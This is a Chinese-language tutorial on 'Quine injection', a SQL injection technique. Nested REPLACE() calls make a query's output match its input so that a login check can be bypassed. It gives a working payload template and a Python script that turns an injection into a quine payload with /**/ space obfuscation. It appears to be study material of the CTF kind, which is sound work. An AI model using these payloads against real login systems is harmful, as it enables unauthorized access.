## Quine注入

### 简介

**Quine 注入** 是一种特殊的 **SQL 注入** 技术，其核心思想是利用 **自生成代码（Quine）** 的特性，构造一个 Payload，使得注入的 SQL 代码在执行时能够 **自我复制** 或 **自我生成**，也就是输入输出一致，从而绕过限制登录

### 构造

在介绍原理之前先说下要用到的函数 `replace()` ，语法如下

```
REPLACE(str, from_str, to_str)
```

> 1. `str`：原始字符串，需要进行替换的字符串。
> 2. `from_str`：需要被替换的子字符串。
> 3. `to_str`：替换后的新子字符串。

`replace(a,b,c)` 简单来说也就是把 a 中的 b 换成 c，如果 `from_str` 不存在于 `str` 中，则返回原始字符串

举两个简单的例子

然后就是构造 quine 语句了，先看个简单的语句

```
select replace(".",char(46),".");
```

`char(46)` 就是 `.`，所以这个语句会返回 `.`

然后接着继续替换

```
select replace('replace(".",char(46),".")',char(46),'replace(".",char(46),".")');
```

这个语句就是将 `replace(".",char(46),".")` 中的 `.` 替换成 `replace(".",char(46),".")` ，看下结果就知道为啥这样做了

![](C:\Users\28698\AppData\Roaming\Typora\typora-user-images\image-20250309171051563.png)![image-20250309171051563.png](images/06d54495-a867-3992-b7f6-d7d812be071e)

我们可以看到输入和输出已经快要趋于一样了，但是有单双引号的区别，但是这里的双引号是不可避免的，因为想要将 `.` 当成字符串输入就必须要用双引号，不然会报错。转义是不行的，因为会多 `\` 符号

经过上面的分析，我们现在只需要解决单双引号的问题即可达到输入输出一致

`char(34)` 为 `"` ，`char(39)` 为 `'`，继续构造

**0x01**

如果将最内层的 replace 函数的点全部替换为单引号包裹 ， 那么最终查询结果也是单引号包裹的

```
replace(replace('"."',char(34),char(39)),char(46),".");
```

这里内层的 replace 没有用单引号包裹，说明是先执行内层的 replace ，再执行的外层的 replace，最终返回 `'.'`，至此已经解决的引号不同的问题

**0x02**

最终payload

```
replace(replace('replace(replace(".",char(34),char(39)),char(46),".")',char(34),char(39)),char(46),'replace(replace(".",char(34),char(39)),char(46),".")');
```

### 总结

因此我们可以得到quine注入的基本形式

```
select replace(replace('str',char(34),char(39)),char(46),'str');
```

str 的基本形式

```
select replace(replace(".",char(34),char(39)),char(46),".");
```

一个好用的脚本

```
sql = input ("输入你的sql语句,不用写关键查询的信息  形如 1'union select #
")
sql2 = sql.replace("'",'"')
base = "replace(replace('.',char(34),char(39)),char(46),'.')"
final = ""
def add(string):
    if ("--+" in string):
        tem = string.split("--+")[0] + base + "--+"
    if ("#" in string):
        tem = string.split("#")[0] + base + "#"
    return tem
def patch(string,sql):
    if ("--+" in string):
        return sql.split("--+")[0] + string + "--+"
    if ("#" in string):
        return sql.split("#")[0] + string + "#"

res = patch(base.replace(".",add(sql2)),sql).replace(" ","/**/").replace("'.'",'"."')

print(res)
```
